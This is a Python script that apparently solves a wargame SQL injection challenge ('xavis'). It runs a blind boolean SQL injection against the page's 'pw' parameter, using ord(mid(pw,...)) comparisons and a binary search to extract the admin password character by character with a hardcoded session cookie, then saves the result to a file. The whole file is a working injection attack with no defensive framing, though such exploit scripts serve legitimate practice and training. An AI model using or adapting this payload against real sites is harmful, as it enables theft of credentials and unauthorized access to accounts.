import requests, urllib

url = "https://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php"

cookie = {"PHPSESSID":"oj8l6aabt4juigeiduqcn1jl73"}

plen = 40 / 4
print("[*] Password length is " + str(plen))

password = ""

for i in range(plen):
    now_value = 256 / 2
    for j in range(256):
        param = {"pw": "' or id='admin' and ord(mid(pw," + str(i+1) + ",1))>="+str(now_value) + "-- -"}
        response = requests.get(url, params=param, cookies=cookie)
        if "<h2>Hello admin</h2>" in response.text:
            param = {"pw": "' or id='admin' and ord(mid(pw," + str(i+1) + ",1))="+str(now_value) + "-- -"}
            response = requests.get(url, params=param, cookies=cookie)
            if "<h2>Hello admin</h2>" in response.text:
                password += chr(now_value)
                break
            now_value += 256 / 2**(j+2)
        else:
            now_value -= 256 / 2**(j+2)
        print("[*] searching " + str(i+1) + " password character.. now " + str(now_value))
    print("[*] found password " + str(i+1) +" character!(" + str(now_value) + ") now : " + password)

print("[*] password is " + password + "(hex : 0x" + password.encode("hex") + ", raw : " + password.encode("hex").decode("hex") + ")")

f = open("./19_xavis_password.txt", "w+")
f.write(password)
f.close()